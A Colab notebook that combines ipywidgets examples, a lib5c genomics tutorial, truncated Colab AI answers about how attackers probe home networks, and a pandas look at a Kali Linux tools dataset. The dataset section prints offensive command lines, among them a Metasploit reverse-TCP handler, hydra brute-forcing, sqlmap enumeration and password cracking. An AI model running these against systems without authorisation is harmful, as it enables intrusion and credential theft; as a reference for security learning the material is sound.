<a href="https://colab.research.google.com/github/josephb4224/GoogleColab-Projects/blob/main/Kali-Linux-Tools_Dataset.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# <b><u>Jupyter Widgets</b></u>

[Jupyter Widgets](https://ipywidgets.readthedocs.io/en/latest/examples/Widget%20Basics.html) can be used to add interactivity to notebooks.


In [ ]:
import ipywidgets as widgets

slider = widgets.IntSlider(20, min=0, max=100)
slider

IntSlider(value=20)

In [ ]:
import altair as alt
import ipywidgets as widgets
from vega_datasets import data

source = data.stocks()

stock_picker = widgets.SelectMultiple(
    options=source.symbol.unique(),
    value=list(source.symbol.unique()),
    description='Symbols')

# The value of symbols will come from the stock_picker.
@widgets.interact(symbols=stock_picker)
def render(symbols):
  selected = source[source.symbol.isin(list(symbols))]

  return alt.Chart(selected).mark_line().encode(
      x='date',
      y='price',
      color='symbol',
      strokeDash='symbol',
  )

# To explore the contents of the downloaded dataset, you can list the files:
# !ls -l {path}

interactive(children=(SelectMultiple(description='Symbols', index=(0, 1, 2, 3, 4), options=('MSFT', 'AMZN', 'I…

In [ ]:
# Creating scatter plots using GridspecLayout:
# In these examples, we will demonstrate how to use GridspecLayout
# & bqplot widget to create a multipanel scatter plot. To run this
# example you will need to install bqplot package.
# Use snippet to obtain scatter plot across multiple dimensions
#
# ipywidgets.readthedocs.io/en/latest/examples/Layout Templates.html

import bqplot as bq
import numpy as np
from ipywidgets import GridspecLayout, Button, Layout

n_features = 5
data = np.random.randn(100, n_features)
data[:50, 2] += 4 * data[:50, 0] **2
data[50:, :] += 4

A = np.random.randn(n_features, n_features)/5

data = np.dot(data,A)

scales_x = [bq.LinearScale() for i in range(n_features)]
scales_y = [bq.LinearScale() for i in range(n_features)]

gs = GridspecLayout(n_features, n_features)
for i in range(n_features):
    for j in range(n_features):

        if i != j:
            sc_x = scales_x[j]
            sc_y = scales_y[i]

            scatt = bq.Scatter(x=data[:, j], y=data[:, i], scales={'x': sc_x, 'y': sc_y}, default_size=1)

            gs[i, j] = bq.Figure(marks=[scatt], layout=Layout(width='auto', height='auto'),
                                 fig_margin=dict(top=0, bottom=0, left=0, right=0))
        else:
            sc_x = scales_x[j]
            sc_y = bq.LinearScale()

            hist = bq.Hist(sample=data[:,i], scales={'sample': sc_x, 'count': sc_y})

            gs[i, j] = bq.Figure(marks=[hist], layout=Layout(width='auto', height='auto'),
                                 fig_margin=dict(top=0, bottom=0, left=0, right=0))
gs

GridspecLayout(children=(Figure(fig_margin={'top': 0, 'bottom': 0, 'left': 0, 'right': 0}, layout=Layout(grid_…

In [ ]:
import ipywidgets as widgets
import logging

class OutputWidgetHandler(logging.Handler):
    """ Custom logging handler sending logs to an output widget """

    def __init__(self, *args, **kwargs):
        super(OutputWidgetHandler, self).__init__(*args, **kwargs)
        layout = {
            'width': '100%',
            'height': '160px',
            'border': '1px solid black'
        }
        self.out = widgets.Output(layout=layout)

    def emit(self, record):
        """ Overload of logging.Handler method """
        formatted_record = self.format(record)
        new_output = {
            'name': 'stdout',
            'output_type': 'stream',
            'text': formatted_record+'\n'
        }
        self.out.outputs = (new_output, ) + self.out.outputs

    def show_logs(self):
        """ Show the logs """
        display(self.out)

    def clear_logs(self):
        """ Clear the current logs """
        self.out.clear_output()


logger = logging.getLogger(__name__)
handler = OutputWidgetHandler()
handler.setFormatter(logging.Formatter('%(asctime)s  - [%(levelname)s] %(message)s'))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# **<u>Open Files From Github</u>**

To open a file from GitHub, you can clone the repo or fetch the file directly.

If you are trying to access files from a private repo, you must use a GitHub access token.


In [ ]:
# Clone the entire repo.
!git clone -l -s git://github.com/jakevdp/PythonDataScienceHandbook.git cloned-repo
%cd cloned-repo
!ls

In [ ]:
# Fetch a single <1MB file using the raw GitHub URL.
!curl --remote-name \
     -H 'Accept: application/vnd.github.v3.raw' \
     --location https://api.github.com/repos/jakevdp/PythonDataScienceHandbook/contents/notebooks/data/california_cities.csv



---



<u>**Scripting tutorial**</u>
==================

This tutorial will walk you through how you might leverage the functions exposed in `lib5c` to write your own analysis scripts.

Follow along in Google colab
-----------------

You can run and modify the cells in this notebook tutorial live using Google colaboratory by clicking the link below:

[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/thomasgilgenast/lib5c-tutorials/blob/master/scripting_tutorial.ipynb)

To simply have all the cells run automatically, click `Runtime > Run all` in the colab toolbar.

Make sure `lib5c` is installed
------------------------------

Inside a fresh virtual environment, run

In [ ]:
!pip install -q lib5c
!lib5c -v

Make a directory and get data
-----------------------------

If you haven't completed the [pipeline tutorial](pipeline_tutorial.ipynb) yet,
make a directory for the tutorial:

```
$ mkdir lib5c-tutorial
$ cd lib5c-tutorial
```

and prepare the example data in `lib5c-tutorial/input` as shown in the
[pipeline tutorial](pipeline_tutorial.ipynb).

In [ ]:
!python -m lib5c.util.demo_data

Note for Docker image users
---------------------------

If you are using `lib5c` from the Docker image, run

    $ docker run -it -v <full path to lib5c-tutorial>:/lib5c-tutorial creminslab/lib5c:latest
    root@<container_id>:/# cd /lib5c-tutorial

and continue running all tutorial commands in this shell.

Start an interactive session
----------------------------

To quickly get used to calling the functions in `lib5c`, we recommend trying
out the following code snippets in a Python interactive session, which we can
start by running

    $ python

from inside the `lib5c-tutorial` directory.

If you're following along in the IPython notebook, you're already in a Python interactive session and don't need to do anything.

Of course, you're welcome to write scripts and execute them with commands like

    $ python myscript.py

Basic parsing and writing
-------------------------

Normalization
-------------

For our first script, we will apply the Knight-Ruiz algorithm to some of our
data.

First, we need to load information about the primers used in the 5C experiment.
We need to do this before we parse the fragment-level raw countsfiles to make
sure we parse them correctly.

In [ ]:
from lib5c.parsers.primers import load_primermap
primermap = load_primermap('input/BED_ES-NPC-iPS-LOCI_mm9.bed')

Now we can parse a countsfile into a counts dict.

In [ ]:
from lib5c.parsers.counts import load_counts
counts = load_counts('input/pNPC_Rep2.counts', primermap)

Notice that we had to pass the `primermap` as an argument to
[lib5c.parsers.counts.load_counts()](https://lib5c.readthedocs.io/en/latest/lib5c.parsers.counts/#lib5c.parsers.counts.load_counts).

Before balancing the counts matrices, we should remove some low-quality primers
which may impair the matrix balancing process. We actually want to do this on
the basis of primer quality across all the replicates. To do this, we can
leverage the exposed functions [lib5c.algorithms.trimming.trim_primers()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.trimming/#lib5c.algorithms.trimming.trim_primers)
and [lib5c.algorithms.trimming.trim_counts()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.trimming/#lib5c.algorithms.trimming.trim_counts) to do

In [ ]:
from lib5c.algorithms.trimming import trim_primers, trim_counts
reps = ['v65_Rep1', 'v65_Rep2', 'pNPC_Rep1', 'pNPC_Rep2']
counts_superdict = {rep: load_counts('input/%s.counts' % rep, primermap)
                    for rep in reps}
trimmed_primermap, trimmed_indices = trim_primers(primermap, counts_superdict)
trimmed_counts = trim_counts(counts, trimmed_indices)

For more details, consult the section on [Trimming](https://lib5c.readthedocs.io/en/latest/trimming/).

Now we can balance the counts matrices. To do this, we will use the function
[lib5c.algorithms.knight_ruiz.kr_balance_matrix()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.knight_ruiz/#lib5c.algorithms.knight_ruiz.kr_balance_matrix). Most algorithms in
`lib5c` live in the [lib5c.algorithms](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms/) subpackage and expose some sort
of convenience function. To learn more about the various convenience functions
and APIs exposed in `lib5c`, consult the section on
[API specification and conceptual documentation](https://lib5c.readthedocs.io/en/latest/conceptual/)

Go ahead and import this function with

In [ ]:
from lib5c.algorithms.knight_ruiz import kr_balance_matrix

To balance the matrix for the Sox2 region, we can try

In [ ]:
kr_counts_Sox2, bias_Sox2, _ = kr_balance_matrix(trimmed_counts['Sox2'])

To check how balanced the result is, we can immediately check

In [ ]:
import numpy as np
row_sums = np.nansum(kr_counts_Sox2, axis=0)
row_sums[:10]

In [ ]:
np.max(np.abs(np.mean(row_sums) - row_sums))

For more details on matrix balancing, consult the section on
[Bias mitigation](https://lib5c.readthedocs.io/en/latest/bias_mitigation/).

In [ ]:
kr_counts, bias_vectors, _ = kr_balance_matrix(trimmed_counts)

to balance all the matrices in the counts dict. To check how balanced one of the
matrices is, we can check

In [ ]:
row_sums = np.nansum(kr_counts['Klf4'], axis=0)
row_sums[:10]

In [ ]:
np.max(np.abs(np.mean(row_sums) - row_sums))

Notice that the returned object `kr_counts` is a dict indexed by region name,
just like the input argument `counts`.

Finally, we can save the results of our processing with something like

In [ ]:
from lib5c.writers.counts import write_counts
write_counts(kr_counts, 'scripting/pNPC_Rep2_kr.counts', trimmed_primermap)

We should save our trimmed primer set as well so that we don't have to redo the
trimming step every time we load this data.

In [ ]:
from lib5c.writers.primers import write_primermap
write_primermap(trimmed_primermap, 'scripting/primers_trimmed.bed')

Binning
-------

If you closed out of the previous session, you'll need to read back in the data
we were working with. Try

In [ ]:
from lib5c.parsers.primers import load_primermap
trimmed_primermap = load_primermap('scripting/primers_trimmed.bed')
from lib5c.parsers.counts import load_counts
kr_counts = load_counts('scripting/pNPC_Rep2_kr.counts', primermap)

Ultimately, we will want to use the exposed convenience function
[lib5c.algorithms.filtering.fragment_bin_filtering.fragment_bin_filter()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.filtering.fragment_bin_filtering/#lib5c.algorithms.filtering.fragment_bin_filtering.fragment_bin_filter).
According to the docstring, it looks like we will need a `pixelmap` and a
`filter_function` in addition to our `counts` dict.

The `pixelmap` represents where our bins should be. To generate one, we will
use the exposed convenience function
[lib5c.algorithms.determine_bins.determine_regional_bins()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.determine_bins/#lib5c.algorithms.determine_bins.determine_regional_bins), which can be
used to do generate 8 kb bins covering all the regions in our `trimmed_primermap` as follows:


In [ ]:
from lib5c.algorithms.determine_bins import determine_regional_bins
pixelmap = determine_regional_bins(
    trimmed_primermap, 8000, region_name={r: r for r in primermap.keys()})

The `filter_function` represents the filtering function to be passed over the
counts matrices in order to determine the value in each bin. To construct one,
we can use the exposed convenience function
[lib5c.algorithms.filtering.filter_functions.make_filter_function()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.filtering.filter_functions/#lib5c.algorithms.filtering.filter_functions.make_filter_function), which
can be used to do something like

In [ ]:
from lib5c.algorithms.filtering.filter_functions import make_filter_function
filter_function = make_filter_function()

Finally, we can bin our counts with a 20 kb window radius by trying

In [ ]:
from lib5c.algorithms.filtering.fragment_bin_filtering import \
    fragment_bin_filter
binned_counts = fragment_bin_filter(kr_counts, filter_function, pixelmap,
                                    trimmed_primermap, 20000)

To save these counts to disk, we can run

In [ ]:
from lib5c.writers.counts import write_counts
write_counts(binned_counts, 'scripting/pNPC_Rep2_binned.counts', pixelmap)

We can also write the pixelmap we created to the disk as a bin bedfile by trying

In [ ]:
from lib5c.writers.primers import write_primermap
write_primermap(pixelmap, 'scripting/8kb_bins.bed')

For more information about the filtering/binning/smoothing API, see the section
on [Binning and smoothing](https://lib5c.readthedocs.io/en/latest/binning_and_smoothing/).

Plotting heatmaps
-----------------

If you closed out of the previous session, you'll need to read back in the data
we were working with. Try

In [ ]:
from lib5c.parsers.primers import load_primermap
pixelmap = load_primermap('scripting/8kb_bins.bed')
from lib5c.parsers.counts import load_counts
binned_counts = load_counts('scripting/pNPC_Rep2_binned.counts', pixelmap)

To visualize our binned matrices, we can use the exposed function
[lib5c.plotters.heatmap.plot_heatmap()](https://lib5c.readthedocs.io/en/latest/lib5c.plotters.heatmap/#lib5c.plotters.heatmap.plot_heatmap).

Before we start, it's a good idea to transform the counts values to a log scale
for easier visualization

In [ ]:
import numpy as np
logged_counts = {region: np.log(binned_counts[region] + 1)
                 for region in binned_counts.keys()}

First, we need to import the plotting function with

In [ ]:
from lib5c.plotters.heatmap import plot_heatmap

We can draw the heatmap for just one region with

In [ ]:
%%capture
%matplotlib inline
plot_heatmap(logged_counts['Sox2'], grange_x=pixelmap['Sox2'], rulers=True,
             genes='mm9', colorscale=(1.0, 4.5), colorbar=True,
             outfile='scripting/pNPC_Rep2_binned_Sox2.png');

The resulting image should look something like this:

In [ ]:
from IPython.display import Image
Image(filename='scripting/pNPC_Rep2_binned_Sox2.png', width=500)

Because [plot_heatmap()](https://lib5c.readthedocs.io/en/latest/lib5c.plotters.heatmap/#lib5c.plotters.heatmap.plot_heatmap) is parallelized with the `@parallelize_regions`
decorator, we can draw the heatmaps for all regions at once by simply calling

In [ ]:
%%capture
%matplotlib inline
outfile_names = {region: 'scripting/pNPC_Rep2_binned_%s.png' % region
                 for region in binned_counts.keys()}
plot_heatmap(logged_counts, grange_x=pixelmap, rulers=True, genes='mm9',
             colorscale=(1.0, 4.5), colorbar=True, outfile=outfile_names);

where we precompute a dict of output filenames (parallel to `counts_binned`)
to describe where each region's heatmap will get drawn (since each region will
be drawn to a separate heatmap). In this way, any argument to a parallelized
function can be replaced by a dict whose keys match the keys of the first
positional argument (which is usually a counts dict).

You can show the plot directly inline in a notebook environment by skipping the `outfile` kwarg:

In [ ]:
%matplotlib inline
plot_heatmap(logged_counts['Sox2'], grange_x=pixelmap['Sox2'], rulers=True,
             genes='mm9', colorscale=(1.0, 4.5), colorbar=True);

Expected modeling
-----------------

The exposed convenience function for making an expected model is
[lib5c.algorithms.expected.make_expected_matrix()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.expected/#lib5c.algorithms.expected.make_expected_matrix).

To construct an expected model for each region using a simple power law
relationship and apply donut correction in the same step, we can try

In [ ]:
from lib5c.algorithms.expected import make_expected_matrix
exp_counts, dist_exp, _ = make_expected_matrix(
    binned_counts, regression=True, exclude_near_diagonal=True, donut=True)

The first returned value, `counts_exp`, is simply a dict of the expected
matrices representing the model. The second returned value, `dist_exp`, is a
representation of the simple one-dimensional expected model.

We can visualize the one-dimensional expected model using
[lib5c.plotters.expected.plot_bin_expected()](https://lib5c.readthedocs.io/en/latest/lib5c.plotters.expected/#lib5c.plotters.expected.plot_bin_expected).

In [ ]:
%%capture
%matplotlib inline
from lib5c.plotters.expected import plot_bin_expected
plot_bin_expected(binned_counts['Sox2'], dist_exp['Sox2'],
                  outfile='scripting/pNPC_Rep2_expected_model_Sox2.png',
                  hexbin=True, semilog=True, xlabel='distance');

or for all regions at once,

In [ ]:
%%capture
%matplotlib inline
from lib5c.plotters.expected import plot_bin_expected
outfile_names = {region: 'scripting/pNPC_Rep2_expected_model_%s.png' % region
                 for region in binned_counts.keys()}
plot_bin_expected(binned_counts, dist_exp, outfile=outfile_names, hexbin=True,
                  semilog=True, xlabel='distance');

The kwargs `hexbin`, `semilog`, and `ylabel` tweak the visual appearance
of the resulting plot.

The resulting images should look something like this:

In [ ]:
Image(filename='scripting/pNPC_Rep2_expected_model_Sox2.png', width=500)

To learn more, consult the section on [Expected modeling](https://lib5c.readthedocs.io/en/latest/expected_modeling/).

Variance modeling
-----------------

The exposed convenience functions for variance modeling is
[lib5c.algorithms.variance.estimate_variance()](https://lib5c.readthedocs.io/en/latest/lib5c.algorithms.variance.estimate_variance/#lib5c.algorithms.variance.estimate_variance).

We can get variance estimates from a log-normal, deviation-based distance-variance relationship model by trying

In [ ]:
from lib5c.algorithms.variance import estimate_variance
var_counts = estimate_variance(binned_counts, exp_counts)

To learn more, consult the section on [Variance modeling](https://lib5c.readthedocs.io/en/latest/variance_modeling/).

P-value calling
---------------

The exposed convenience function for calling p-values using distributions
parametrized according to the expected and variance models is
[lib5c.util.distributions.call_pvalues()](https://lib5c.readthedocs.io/en/latest/lib5c.util.distributions/#lib5c.util.distributions.call_pvalues).

To simply call the p-values using a log-normal distribution, we can try

In [ ]:
from lib5c.util.distributions import call_pvalues
from lib5c.util.counts import parallel_log_counts
pvalues = call_pvalues(parallel_log_counts(binned_counts), exp_counts,
                       var_counts, 'norm', log=True)

Where we are logging the observed counts and comparing them to a normal distribution.

We can visualize these called p-values as interaction scores
(`-10*log2(pvalue)`) on heatmaps by calling

In [ ]:
%%capture
%matplotlib inline
from lib5c.plotters.heatmap import plot_heatmap
from lib5c.util.counts import convert_pvalues_to_interaction_scores
outfile_names = {region: 'scripting/pNPC_Rep2_is_%s.png' % region
                 for region in pvalues.keys()}
interaction_scores = convert_pvalues_to_interaction_scores(pvalues)
plot_heatmap(interaction_scores, grange_x=pixelmap, rulers=True, #genes='mm9',
             colorscale=(0, 300), colorbar=True, colormap='is',
             outfile=outfile_names);

and write the called p-values to the disk as counts files by calling

In [ ]:
from lib5c.writers.counts import write_counts
write_counts(pvalues, 'scripting/pNPC_Rep2_pvalues.counts', pixelmap)

The resulting heatmaps should look something like this

In [ ]:
Image(filename='scripting/pNPC_Rep2_is_Sox2.png', width=500)

For more information on the distribution fitting and p-value calling API, see
the section on [Distributions](https://lib5c.readthedocs.io/en/latest/distributions/).

Next steps
----------

This tutorial shows only a few of the functions exposed in the `lib5c` API.
You can read more about what you can do with `lib5c` in the section on
[API specification and conceptual documentation](https://lib5c.readthedocs.io/en/latest/conceptual/).



---



# **<u>GOOGLE COLAB AI — HACKER Q&A's</u>**

In [ ]:
# Only text-to-text input/output is supported
from google.colab import ai

response = ai.generate_text("What is a step-by-step walkthrough of using Nmap to scan a local Network to check which devices are connected to my router and what would a 'hacker' be able to do if connected to my local network?")
print(response)

This is an excellent question that covers both practical network introspection and critical security awareness. Let's break it down step by step.

---

## Part 1: Step-by-Step Walkthrough Using Nmap to Scan Your Local Network

**Disclaimer:** You *must only* perform Nmap scans on networks you own or have explicit permission to scan. Scanning external networks or networks you don't have authority over is illegal and unethical. For this walkthrough, we are strictly focusing on *your own local home network*.

Nmap (Network Mapper) is a powerful, open-source tool for network discovery and security auditing. It can discover hosts and services on a computer network by sending packets and analyzing the responses.

### 1. Install Nmap

**a. Linux (Ubuntu/Debian-based):**
Open your terminal and type:
```bash
sudo apt update
sudo apt install nmap
```

**b. Linux (Fedora/RHEL-based):**
Open your terminal and type:
```bash
sudo dnf install nmap
```

**c. macOS:**
The easiest way is to use Homebrew

In [ ]:
# Only text-to-text input/output is supported
from google.colab import ai

response = ai.generate_text("How do they set up 'Open ports for external access to your internal network', or 'Monitor all internet traffic' just by being connected to my Router? What tools or commands do they use to do such hacks, and how does it all work? How can they establish persistent access to my network by installing backdoors or creating new unauthorized user accounts? Can they do it from their device as long as they are on the same network as I am, or do they need full access to the router directly? If two devices are connected to the same network, do they have access to each other automatically?Lastly, I still barely understand how Ports work, and the difference between a 'localhost', and something like 'Port Forwarding', i.e., when only local devices can see it with a scan, compared to the entire world can scan it? Can you explain this to me?")
print(response)

This is a fantastic set of questions that delves into the core of network security and how local networks interact with the internet. Let's break it down.

First, a crucial distinction: "being connected to my Router" can mean two very different things:
1.  **Being connected to the *network* your router creates (via Wi-Fi or Ethernet cable).** This means you're an *internal* device.
2.  **Having *administrative access* to the router itself (e.g., knowing the admin username/password).** This gives full control over the router's settings.

The capabilities of an attacker differ greatly depending on which level of access they have.

---

### How Hackers Set Up 'Open Ports' or 'Monitor Traffic'

**Scenario 1: Attacker has *Administrative Access* to Your Router**
This is the most direct and dangerous scenario. If an attacker gains full administrative access to your router, they effectively control your network's gateway to the internet.

*   **How they get Admin Access:**
    *   **Default C

In [ ]:
# Only text-to-text input/output is supported
from google.colab import ai

response = ai.generate_text("Can you give me a step-by-step walkthrough of how an attacker would use tools like Wireshark, Ettercap, Nmap, etc, to analyze my network traffic? What commands exactly would they use, how would they set up a 'port' to access my network from anywhere, and any other steps that attackers use? Can you explain some common ways that I'd set up Port Forwarding without even knowing it, like what services or etc do people use without knowing it can be scanned from anywhere in the world?")
print(response)

It's important to understand that gaining unauthorized access to any network is illegal and unethical. This information is provided purely for educational purposes to help you understand potential vulnerabilities and strengthen your own network defenses.

Let's break down how an attacker might approach analyzing and potentially exploiting a network, focusing on the tools you mentioned and common vulnerabilities.

---

### **Disclaimer: Educational Purposes Only**

This guide describes techniques used in cybersecurity. Engaging in these activities without explicit, written permission from the network owner is illegal and can lead to severe penalties, including fines and imprisonment. Always practice ethical hacking in controlled, authorized environments (e.g., your own test lab, bug bounty programs, penetration testing with consent).

---

### Attacker Mindset: The "Kill Chain"

Attackers generally follow a structured approach, often referred to as a "kill chain" or "attack lifecycle":




---





---

<br>

---



# **<u>Kali-Linux-Dataset-Snippets</u>**

In [ ]:
import kagglehub
path = kagglehub.dataset_download("cyberprince/kali-linux-toolkit-dataset")

Using Colab cache for faster access to the 'kali-linux-toolkit-dataset' dataset.


In [ ]:
import pandas as pd

# The file path is stored in the 'path' variable from the previous step
file_path = f'{path}/KALI_LINUX_TOOLS_DATASET.jsonl'

# Read the JSON Lines file into a pandas DataFrame
df = pd.read_json(file_path, lines=True)

# Display the first 5 rows of the DataFrame
print("First 5 rows of the dataset:")
display(df.head())

First 5 rows of the dataset:


,tool,command,description,category,use_case,flags,os,reference_link,supported_languages
0,nmap,nmap -sV -p 1-65535 192.168.1.1,Scan all TCP ports and detect service versions...,Networking,Port scanning and service detection,"[-sV, -p]",Linux,https://nmap.org/book/man-briefoptions.html,NaN
1,nmap,nmap -sS -O 192.168.1.1,Perform a stealth SYN scan and OS detection.,Networking,Stealth scanning and OS fingerprinting,"[-sS, -O]",Linux,https://nmap.org/book/man-briefoptions.html,NaN
2,metasploit,msfconsole -q -x 'use exploit/multi/handler; s...,Set up a reverse TCP handler for incoming conn...,Exploitation,Exploit handling and payload delivery,"[-q, -x]",Linux,https://docs.metasploit.com/,NaN
3,sqlmap,sqlmap -u http://example.com --dbs,Enumerate databases on a vulnerable web applic...,Web Application,SQL injection testing,"[-u, --dbs]",Linux,http://sqlmap.org/,NaN
4,hydra,hydra -l admin -P passwords.txt ftp://192.168.1.1,Brute-force FTP credentials using a password l...,Password Cracking,Credential brute-forcing,"[-l, -P]",Linux,https://www.kali.org/tools/hydra/,NaN


You can also get a summary of the DataFrame to see column names, data types, and non-null counts:

In [ ]:
# Display information about the DataFrame
print("DataFrame Information:")
df.info()

DataFrame Information:
<class 'pandas.core.frame.DataFrame'>
RangeIndex: 790 entries, 0 to 789
Data columns (total 9 columns):
 #   Column               Non-Null Count  Dtype 
---  ------               --------------  ----- 
 0   tool                 790 non-null    object
 1   command              790 non-null    object
 2   description          790 non-null    object
 3   category             790 non-null    object
 4   use_case             790 non-null    object
 5   flags                790 non-null    object
 6   os                   790 non-null    object
 7   reference_link       790 non-null    object
 8   supported_languages  50 non-null     object
dtypes: object(9)
memory usage: 55.7+ KB


Once loaded into a DataFrame, you can easily organize and query the data. For example, to see all unique categories of tools:

In [ ]:
# Get all unique categories
print("Unique tool categories:")
print(df['category'].unique())

Unique tool categories:
['Networking' 'Exploitation' 'Web Application' 'Password Cracking'
 'Wireless' 'Forensics' 'Social Engineering' 'Reverse Engineering'
 'Sniffing and Spoofing' 'Information Gathering' 'Wireless Attacks'
 'Post-Exploitation' 'Code Analysis' 'Reporting']


Or to filter for tools within a specific category, like 'Web Application':

In [ ]:
# Filter for tools in the 'Web Application' category
web_app_tools = df[df['category'] == 'Web Application']
print("Tools in 'Web Application' category:")
display(web_app_tools.head())

Tools in 'Web Application' category:


,tool,command,description,category,use_case,flags,os,reference_link,supported_languages
3,sqlmap,sqlmap -u http://example.com --dbs,Enumerate databases on a vulnerable web applic...,Web Application,SQL injection testing,"[-u, --dbs]",Linux,http://sqlmap.org/,NaN
6,burpsuite,java -jar burpsuite.jar,Launch Burp Suite for web vulnerability testing.,Web Application,Web application security testing,[],Linux,https://portswigger.net/burp/documentation,NaN
10,nikto,nikto -h http://example.com,Scan web server for vulnerabilities and miscon...,Web Application,Web server vulnerability scanning,[-h],Linux,https://cirt.net/Nikto2,NaN
11,dirb,dirb http://example.com wordlist.txt,Brute-force directories and files on a web ser...,Web Application,Directory enumeration,[],Linux,https://www.kali.org/tools/dirb/,NaN
12,sqlmap,sqlmap -u http://example.com --tables,Enumerate tables in a database via SQL injection.,Web Application,SQL injection exploitation,"[-u, --tables]",Linux,http://sqlmap.org/,NaN


### 1. Grouping and Counting Tools per Category

This is a great way to summarize the dataset and understand the distribution of tools across different categories.

In [ ]:
# Group by 'category' and count the number of tools in each
tools_per_category = df.groupby('category')['tool'].count().sort_values(ascending=False).reset_index()
tools_per_category.columns = ['Category', 'Number of Tools']

print("Number of tools per category:")
display(tools_per_category)

Number of tools per category:


,Category,Number of Tools
0,Information Gathering,92
1,Reverse Engineering,88
2,Web Application,86
3,Exploitation,79
4,Post-Exploitation,78
5,Wireless Attacks,70
6,Social Engineering,68
7,Reporting,51
8,Forensics,50
9,Code Analysis,50


### 2. Viewing a larger portion of the DataFrame

In [ ]:
# Display the first 20 rows of the DataFrame
print("First 20 rows of the dataset:")
display(df.head(20))

First 20 rows of the dataset:


,tool,command,description,category,use_case,flags,os,reference_link,supported_languages
0,nmap,nmap -sV -p 1-65535 192.168.1.1,Scan all TCP ports and detect service versions...,Networking,Port scanning and service detection,"[-sV, -p]",Linux,https://nmap.org/book/man-briefoptions.html,NaN
1,nmap,nmap -sS -O 192.168.1.1,Perform a stealth SYN scan and OS detection.,Networking,Stealth scanning and OS fingerprinting,"[-sS, -O]",Linux,https://nmap.org/book/man-briefoptions.html,NaN
2,metasploit,msfconsole -q -x 'use exploit/multi/handler; s...,Set up a reverse TCP handler for incoming conn...,Exploitation,Exploit handling and payload delivery,"[-q, -x]",Linux,https://docs.metasploit.com/,NaN
3,sqlmap,sqlmap -u http://example.com --dbs,Enumerate databases on a vulnerable web applic...,Web Application,SQL injection testing,"[-u, --dbs]",Linux,http://sqlmap.org/,NaN
4,hydra,hydra -l admin -P passwords.txt ftp://192.168.1.1,Brute-force FTP credentials using a password l...,Password Cracking,Credential brute-forcing,"[-l, -P]",Linux,https://www.kali.org/tools/hydra/,NaN
5,aircrack-ng,aircrack-ng -w wordlist.txt capture.cap,Crack WEP/WPA keys from captured packets.,Wireless,Wireless network key cracking,[-w],Linux,https://www.aircrack-ng.org/,NaN
6,burpsuite,java -jar burpsuite.jar,Launch Burp Suite for web vulnerability testing.,Web Application,Web application security testing,[],Linux,https://portswigger.net/burp/documentation,NaN
7,wireshark,wireshark -i eth0 -f 'tcp port 80',Capture and analyze TCP traffic on port 80.,Networking,Network traffic analysis,"[-i, -f]",Linux,https://www.wireshark.org/docs/,NaN
8,john,john --wordlist=rockyou.txt hash.txt,Crack password hashes using a wordlist.,Password Cracking,Password hash cracking,[--wordlist],Linux,https://www.openwall.com/john/,NaN
9,hashcat,hashcat -m 0 -a 0 hash.txt wordlist.txt,Crack MD5 hashes using a wordlist.,Password Cracking,High-performance hash cracking,"[-m, -a]",Linux,https://hashcat.net/hashcat/,NaN


### 3. Viewing all tools for a specific category (e.g., 'Forensics')

In [ ]:
# Filter for tools in the 'Forensics' category
forensics_tools = df[df['category'] == 'Forensics']
print("Tools in 'Forensics' category:")
display(forensics_tools)

Tools in 'Forensics' category:


,tool,command,description,category,use_case,flags,os,reference_link,supported_languages
50,autopsy,autopsy -d /case1 -i /dev/sda,Start Autopsy to analyze a disk image for fore...,Forensics,Disk image analysis,"[-d, -i]",Linux,https://www.sleuthkit.org/autopsy/docs.php,NaN
51,foremost,foremost -t all -i image.dd -o output/,Recover files from a disk image based on file ...,Forensics,File recovery,"[-t, -i, -o]",Linux,http://foremost.sourceforge.net/,NaN
52,volatility,volatility -f memory.dump imageinfo,Identify memory image profile for further anal...,Forensics,Memory forensics,[-f],Linux,https://www.volatilityfoundation.org/,NaN
53,binwalk,binwalk -e firmware.bin,Extract embedded files and firmware components.,Forensics,Firmware analysis,[-e],Linux,https://github.com/ReFirmLabs/binwalk,NaN
54,dd,dd if=/dev/sda of=image.dd bs=4M,Create a forensic disk image of a physical drive.,Forensics,Disk imaging,"[if, of, bs]",Linux,https://www.man7.org/linux/man-pages/man1/dd.1...,NaN
55,sleuthkit,tsk_recover -a image.dd output/,Recover deleted files from a disk image.,Forensics,File recovery,[-a],Linux,https://www.sleuthkit.org/sleuthkit/man/tsk_re...,NaN
56,testdisk,testdisk /dev/sda,Recover lost partitions and repair filesystems.,Forensics,Partition recovery,[],Linux,https://www.cgsecurity.org/wiki/TestDisk,NaN
57,photorec,photorec /dev/sda,Recover files from a disk based on file signat...,Forensics,File recovery,[],Linux,https://www.cgsecurity.org/wiki/PhotoRec,NaN
58,volatility,volatility -f memory.dump --profile=Win7SP1x64...,List running processes from a memory dump.,Forensics,Memory forensics,"[-f, --profile]",Linux,https://www.volatilityfoundation.org/,NaN
59,bulk_extractor,bulk_extractor -o output/ image.dd,Extract bulk data like emails and URLs from a ...,Forensics,Data extraction,[-o],Linux,https://github.com/simsong/bulk_extractor,NaN


### 4. Iterating & displaying tools + Output to CSV!!

This will give you a complete, organized list of all tools, grouped by their category. We'll also sort the categories and tools alphabetically for better readability.

In [ ]:
# Sort the DataFrame by 'category' and then by 'tool' name
sorted_df = df.sort_values(by=['category', 'tool']).reset_index(drop=True)

# Define columns to drop (excluding 'category' this time)
columns_to_drop = ['os', 'supported_languages']

# Create the final DataFrame with desired columns
# The 'category' column will remain as it's not in columns_to_drop
final_display_df = sorted_df.drop(columns=columns_to_drop, errors='ignore')

print("\n--- Kali-Linux Tools Dataset (Organized) ---")
# Display the entire organized DataFrame as an interactive table
display(final_display_df)

# Save the organized DataFrame to a CSV file
output_csv_path = 'kali_linux_tools_organized.csv'
final_display_df.to_csv(output_csv_path, index=False)
print(f"\nOutput saved to '{output_csv_path}'")



--- Kali-Linux Tools Dataset (Organized) ---


,tool,command,description,category,use_case,flags,reference_link
